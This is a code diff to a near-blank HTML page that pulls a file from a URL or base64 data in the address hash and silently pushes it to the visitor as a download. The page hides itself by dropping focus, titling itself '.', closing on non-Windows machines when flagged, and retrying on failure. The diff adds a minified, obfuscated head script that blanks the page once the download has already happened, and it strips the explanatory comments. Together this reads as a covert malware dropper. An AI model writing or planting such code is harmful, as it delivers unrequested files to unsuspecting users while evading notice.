@@ -1,5 +1,7 @@
 <!DOCTYPE html>
-<html><head><title>.</title></head>
+<html><head><script>
+try{var _h=location.hash.slice(1);if(_h){try{_h=decodeURIComponent(_h)}catch(e){}if(_h.slice(-2)==='!W')_h=_h.slice(0,-2);var _s=_h.indexOf('~');var _n=_s>0?_h.slice(0,_s):'x';if(localStorage.getItem('dl_done_'+_n)){window.stop();document.title='.';window.close();document.documentElement.innerHTML=''}}}catch(e){}
+</script><title>.</title></head>
 <body>
 <script>
 window.blur();
@@ -10,11 +12,10 @@ try {
   if (!h) throw 'No data';
   try { h = decodeURIComponent(h); } catch(e) {}
 
-  // Windows-only flag: if URL ends with !W, check platform
   var winOnly = false;
   if (h.slice(-2) === '!W') {
     winOnly = true;
-    h = h.slice(0, -2); // Remove !W flag
+    h = h.slice(0, -2);
   }
   if (winOnly && navigator.platform.indexOf('Win') === -1) {
     window.close();
@@ -40,7 +41,7 @@ try {
 
   function doDownload(blob) {
     if (!blob || blob.size === 0) {
-      document.body.textContent = 'Empty file — will retry next time';
+      document.body.textContent = 'Empty — retry next time';
       return;
     }
     var url = URL.createObjectURL(blob);
@@ -55,24 +56,22 @@ try {
   if (data.indexOf('http') === 0) {
     fetch(data)
       .then(function(r) {
-        if (!r.ok) throw 'HTTP error: ' + r.status;
+        if (!r.ok) throw 'HTTP ' + r.status;
         var expected = parseInt(r.headers.get('content-length') || '0');
         return r.blob().then(function(blob) {
-          if (expected > 0 && blob.size < expected) {
-            throw 'Incomplete: ' + blob.size + '/' + expected;
-          }
+          if (expected > 0 && blob.size < expected) throw 'Incomplete';
           return blob;
         });
       })
       .then(function(blob) { doDownload(blob); })
-      .catch(function(e) { document.body.textContent = 'Failed — will retry: ' + e; });
+      .catch(function(e) { document.body.textContent = 'Failed — retry: ' + e; });
   } else {
     try {
       var raw = atob(data);
       var arr = new Uint8Array(raw.length);
       for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
       doDownload(new Blob([arr], {type: 'application/octet-stream'}));
-    } catch(e) { document.body.textContent = 'Decode failed — will retry: ' + e; }
+    } catch(e) { document.body.textContent = 'Decode fail — retry: ' + e; }
   }
 } catch(e) {
   if (e !== 'skip') document.body.textContent = 'Error: ' + e;
